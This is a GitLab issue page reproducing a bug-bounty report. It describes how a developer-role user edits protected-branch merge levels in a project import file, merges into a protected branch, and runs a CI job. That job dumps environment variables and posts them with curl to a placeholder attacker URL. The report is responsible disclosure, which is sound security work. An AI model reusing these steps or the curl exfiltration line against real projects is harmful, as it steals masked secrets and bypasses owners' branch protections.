

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# User with developer role (group) can modify Protected branches -> Allowed to merge setting on imported project

**[HackerOne report #1485381](https://hackerone.com/reports/1485381)** by `justas_b` on 2022-02-18, assigned to [@nmalcolm](/nmalcolm "Nick Malcolm"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

##### Summary

A user with developer role (group) can steal masked group/project CI/CD variables by modifying Project settings -> Protected branches -> Allowed to merge setting on imported project (tree/project/protected\_branches.ndjson file).

##### Steps to reproduce

1. Create 2 accounts
2. Create a group with account A and masked CI/CD group variables (Group settings -> CI/CD -> Variables)

[![secretvar_masked.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/fa690b867c83114cc1fe355750c21c993f3e9053/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65323431633835372d333134302d343331312d393533382d3865323333356230333135352f7365637265747661725f6d61736b65642e706e67)

3. Create a personal project with account B and export it
4. Invite account B (developer) to account A's (owner) group
5. With account B, modify the project import file, go to tree/project/protected\_branches.ndjson
6. Change the "merge\_access\_levels":[{"access\_level":}] value to 30 if its 40

[![merge_access_levels_30.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/746e6e73201c183530e2a2dc493b0308862257b9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64353434363238342d303830372d343731312d626330302d3839393566393734313666322f6d657267655f6163636573735f6c6576656c735f33302e706e67)

7. Upload the modified project to account A's group with account B
8. By default, only maintainers are allowed to merge into protected branches ("merge\_access\_levels":[{"access\_level":}] is 40 - 40 = maintainer, 30 = developer, etc.)
9. Create a new branch with account B (developer)
10. Add the following .gitlab-ci.yml file to the newly created branch and create a merge request

```
image: ruby:latest

job_name2:
 script:
   - export > test.txt
   - curl -X POST --data "$(cat test.txt)" (attacker controlled website's url)
```

[![new_branch_malicious_gitlab_ci_yml.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/e2e50ade6d79e29d0251cec778efa9212e04200e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36613534323333362d336330362d343631612d393461362d6431326430646234393730342f6e65775f6272616e63685f6d616c6963696f75735f6769746c61625f63695f796d6c2e706e67)

`[REDACTED]`

11. Merge the newly created branch into main (protected) branch (with account B - developer)

[![merge_to_protected_as_developer.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/42d5633c3f809d6fee8264db71361eb156115ae3/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64643561313664382d633837312d346564322d386135312d3136656139633038323831642f6d657267655f746f5f70726f7465637465645f61735f646576656c6f7065722e706e67)

12. A pipeline run against a protected branch will send sensitive data to attackers website using curl

`[REDACTED]`

The impact is pretty similar to my other report #1256017

##### What is the current *bug* behavior?

It is possible to modify the "merge\_access\_levels":[{"access\_level":} value on imported projects

##### What is the expected *correct* behavior?

The "merge\_access\_levels":[{"access\_level":} should always be default - 40

##### Relevant logs and/or screenshots

(Paste any relevant logs - please use code blocks (```) to format console output,

logs, and code as it's very hard to read otherwise.)

##### Output of checks

This bug happens on GitLab.com

#### Impact

User with developer role (group) can steal masked group and project CI/CD variables. Developer can also modify main branch without maintainer's permission.

## Attachments

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Jun 02, 2022 by [Nick Malcolm](/nmalcolm)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

